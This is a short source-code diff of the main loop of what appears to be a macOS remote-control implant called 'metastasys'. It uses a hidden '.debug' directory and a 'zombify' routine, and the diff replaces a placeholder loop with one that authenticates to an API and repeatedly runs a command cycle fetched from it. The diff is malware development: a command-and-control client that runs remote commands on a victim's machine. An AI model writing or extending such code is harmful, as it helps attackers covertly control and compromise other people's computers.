@@ -7,9 +7,11 @@
 //
 
 #import <Foundation/Foundation.h>
+#import "MSAPI.h"
+#import "MSClient.h"
+
 #include <unistd.h>
 #include <sys/stat.h>
-#import "MSAPI.h"
 
 #define HOME_DIR "Library/.debug"
 #define LOG_OUT ".resources/metastasys.log"
@@ -29,12 +31,15 @@ int main(int argc, const char * argv[]) {
                 zombify();
             }
         }
-        NSLog(@"%@", [[NSUUID UUID] UUIDString]);
-        while (YES) {
-            // Get command from API, execute, send reponse
-            NSLog(@"%s", *argv);
-            sleep(1);
-        }
+        
+        [MSAPI authenticate:^(BOOL success) {
+            if (!success)
+                return;
+            while (YES) {
+                [[MSClient sharedClient] runCommandCycle];
+                sleep(1);
+            }
+        }];
     }
     return 0;
 }
